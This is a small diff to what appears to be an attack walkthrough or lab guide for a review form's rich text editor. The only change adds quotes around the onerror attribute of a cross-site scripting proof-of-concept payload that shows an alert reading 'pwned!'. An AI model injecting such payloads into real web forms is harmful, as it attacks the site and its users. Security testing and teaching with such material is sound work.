@@ -19,7 +19,7 @@ All attacks are submitted through the review form's rich text editor. Switch to 
 **Payload to paste into review notes:**
 
 ```html
-<img src=x onerror=alert('pwned!')>
+<img src=x onerror="alert('pwned!')">
 ```
 
 ---
